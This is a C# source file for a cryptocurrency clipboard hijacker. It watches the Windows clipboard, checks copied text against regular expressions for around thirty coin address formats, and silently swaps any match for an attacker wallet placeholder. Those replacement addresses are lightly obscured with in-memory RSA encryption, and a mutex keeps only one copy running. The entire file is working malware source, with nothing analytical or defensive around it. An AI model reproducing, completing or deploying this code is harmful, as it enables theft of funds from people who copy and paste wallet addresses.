using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

class Program
{
    static Mutex mutex = new Mutex(true, "THE_MUTEX");
    static readonly RSAParameters privateKey;
    static readonly RSAParameters publicKey;
    static readonly Dictionary<string, byte[]> encryptedData = new Dictionary<string, byte[]>();

    static Program()
    {
        using (var rsa = new RSACryptoServiceProvider(2048))
        {
            rsa.PersistKeyInCsp = false;
            privateKey = rsa.ExportParameters(true);
            publicKey = rsa.ExportParameters(false);
        }

        encryptedData.Add("btc", EncryptData(publicKey, Encoding.UTF8.GetBytes("BTC_ADDRESS")));
        encryptedData.Add("ltc", EncryptData(publicKey, Encoding.UTF8.GetBytes("LTC_ADDRESS")));
        encryptedData.Add("xmr", EncryptData(publicKey, Encoding.UTF8.GetBytes("XMR_ADDRESS")));
        encryptedData.Add("eth", EncryptData(publicKey, Encoding.UTF8.GetBytes("ETH_ADDRESS")));
        encryptedData.Add("xrp", EncryptData(publicKey, Encoding.UTF8.GetBytes("XRP_ADDRESS")));
        encryptedData.Add("neo", EncryptData(publicKey, Encoding.UTF8.GetBytes("NEO_ADDRESS")));
        encryptedData.Add("bch", EncryptData(publicKey, Encoding.UTF8.GetBytes("BCH_ADDRESS")));
        encryptedData.Add("doge", EncryptData(publicKey, Encoding.UTF8.GetBytes("DOGE_ADDRESS")));
        encryptedData.Add("dash", EncryptData(publicKey, Encoding.UTF8.GetBytes("DASH_ADDRESS")));
        encryptedData.Add("xlm", EncryptData(publicKey, Encoding.UTF8.GetBytes("XLM_ADDRESS")));
        /*encryptedData.Add("tethersol", EncryptData(publicKey, Encoding.UTF8.GetBytes("SOLANA_ADDRESS")));*/
        encryptedData.Add("bnbbeacon", EncryptData(publicKey, Encoding.UTF8.GetBytes("BNB_ADDRESS")));
        encryptedData.Add("tezos", EncryptData(publicKey, Encoding.UTF8.GetBytes("TEZ_ADDRESS")));
        encryptedData.Add("tron", EncryptData(publicKey, Encoding.UTF8.GetBytes("TRON_ADDRESS")));
        encryptedData.Add("vet", EncryptData(publicKey, Encoding.UTF8.GetBytes("VET_ADDRESS")));
        encryptedData.Add("nano", EncryptData(publicKey, Encoding.UTF8.GetBytes("NANO_ADDRESS")));
        encryptedData.Add("dgb", EncryptData(publicKey, Encoding.UTF8.GetBytes("DGB_ADDRESS")));
        encryptedData.Add("qtum", EncryptData(publicKey, Encoding.UTF8.GetBytes("QTUM_ADDRESS")));
        encryptedData.Add("xem", EncryptData(publicKey, Encoding.UTF8.GetBytes("XEM_ADDRESS")));
        encryptedData.Add("waves", EncryptData(publicKey, Encoding.UTF8.GetBytes("WAVES_ADDRESS")));
        encryptedData.Add("zec", EncryptData(publicKey, Encoding.UTF8.GetBytes("ZEC_ADDRESS")));
        encryptedData.Add("ada", EncryptData(publicKey, Encoding.UTF8.GetBytes("ADA_ADDRESS")));
        encryptedData.Add("dot", EncryptData(publicKey, Encoding.UTF8.GetBytes("DOT_ADDRESS")));
        encryptedData.Add("cosmos", EncryptData(publicKey, Encoding.UTF8.GetBytes("COSMOS_ADDRESS")));
        encryptedData.Add("lsk", EncryptData(publicKey, Encoding.UTF8.GetBytes("LSK_ADDRESS")));
        encryptedData.Add("kava", EncryptData(publicKey, Encoding.UTF8.GetBytes("KAVA_ADDRESS")));
        encryptedData.Add("algo", EncryptData(publicKey, Encoding.UTF8.GetBytes("ALGO_ADDRESS")));
        encryptedData.Add("fil", EncryptData(publicKey, Encoding.UTF8.GetBytes("FIL_ADDRESS")));
        encryptedData.Add("terra", EncryptData(publicKey, Encoding.UTF8.GetBytes("TERRA_ADDRESS")));
        encryptedData.Add("thor", EncryptData(publicKey, Encoding.UTF8.GetBytes("THOR_ADDRESS")));
    }

    static byte[] EncryptData(RSAParameters publicKey, byte[] data)
    {
        using (var rsa = new RSACryptoServiceProvider())
        {
            rsa.ImportParameters(publicKey);
            return rsa.Encrypt(data, false);
        }
    }

    static string ProcessClipboardContent(string text)
    {
        bool dtc = false;

        Dictionary<string, string> patterns = new Dictionary<string, string>
        {
            { "btc", @"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$" },
            { "ltc", @"^(?:[LM3][a-km-zA-HJ-NP-Z1-9]{26,33})$" },
            { "eth", @"(?:^0x[a-fA-F0-9]{40}$)" },
            { "xlm", @"^(?:G[0-9a-zA-Z]{55})$" },
            { "xmr", @"^(?:4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})$" },
            { "xrp", @"^(?:r[0-9a-zA-Z]{24,34})$" },
            { "bch", @"^(bitcoincash:)?(q|p)[a-z0-9]{41}" },
            { "dash", @"^(?:X[1-9A-HJ-NP-Za-km-z]{33})$" },
            { "neo", @"^(?:A[0-9a-zA-Z]{33})$" },
            { "doge", @"^(D|A|9)[a-km-zA-HJ-NP-Z1-9]{33,34}$" },
          /*{ "tethersol", @"^[1-9A-HJ-NP-Za-km-z]{32,44}$" },*/
            { "bnbbeacon", @"^bnb[0-9a-z]{38,42}$" },                                       // BNB // REMOVED
            { "tezos", @"^(tz[1,2,3])[a-zA-Z0-9]{33}$" },
            { "tron", @"^(T|TLa)[1-9A-HJ-NP-Za-km-z]{33}$" },
            { "vet", @"/^0x[a-fA-F0-9]{40}$/g" },
            { "nano", @"^(xrb_|nano_)[13456789abcdefghijkmnopqrstuwxyz]{60}" },
            { "dgb", @"^[DS][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(dgb1)[0-9A-Za-z]{39,59}$" },
            { "qtum", @"^[Q|M][A-Za-z0-9]{33}$" },
            { "xem", @"^(NA|NB|NC|ND)[a-zA-z0-9]{38}$" },
            { "waves", @"^(3P)[0-9A-Za-z]{33}$" },
            { "zec", @"^(t)[A-Za-z0-9]{34}$" },
            { "ada", @"^addr1[a-z0-9]+" },
            { "dot",@"^(1)[0-9a-z-A-Z]{44,50}$" },
            { "cosmos",@"^(cosmos1)[0-9a-z]{38}$" },
            { "lsk",@"^(lsk)[0-9A-Za-z]{38}$" },
            { "kava",@"^(kava1)[0-9a-z]{38}$" },
            { "algo",@"^[A-Z0-9]{58,58}$" },
            { "fil",@"^[a-z0-9]{41}$|[a-z0-9]{86}$" },
            { "terra",@"^(terra1)[0-9a-z]{38}$" },
            { "thor", "^thor1[a-z0-9]{38}$" }
          /*{ "one",@"^(one1)[a-z0-9]{38}$" },  // harmony */
		  /*osmosis*/
        };

        foreach (var pattern in patterns)
        {
            if (Regex.IsMatch(text, pattern.Value))
            {
                dtc = true;
                var decryptedData = Encoding.UTF8.GetString(DecryptData(privateKey, encryptedData[pattern.Key]));
                return decryptedData;
            }
        }

        return text;
    }

    static byte[] DecryptData(RSAParameters privateKey, byte[] data)
    {
        using (var rsa = new RSACryptoServiceProvider())
        {
            rsa.ImportParameters(privateKey);
            return rsa.Decrypt(data, false);
        }
    }

    static void ClipboardListener()
    {
        string prevClipboardContent = "";
        int consecutiveChanges = 0;

        while (true)
        {
            string currentClipboardContent = Clipboard.GetText();

            if (currentClipboardContent != prevClipboardContent)
            {
                prevClipboardContent = currentClipboardContent;
                string decryptedData = ProcessClipboardContent(currentClipboardContent);

                if (decryptedData != currentClipboardContent)
                {
                    Clipboard.SetText(decryptedData);
                    consecutiveChanges++;

                    if (consecutiveChanges >= 999)
                    {
                        break;
                    }
                }
            }

            Thread.Sleep(600);
        }
    }

    [STAThread]
    static void Main()
    {
        if (mutex.WaitOne(TimeSpan.Zero, true))
        {
            try
            {
                ClipboardListener();
                mutex.ReleaseMutex();
            }
            finally
            {
                mutex.Dispose();
            }
        }
    }
}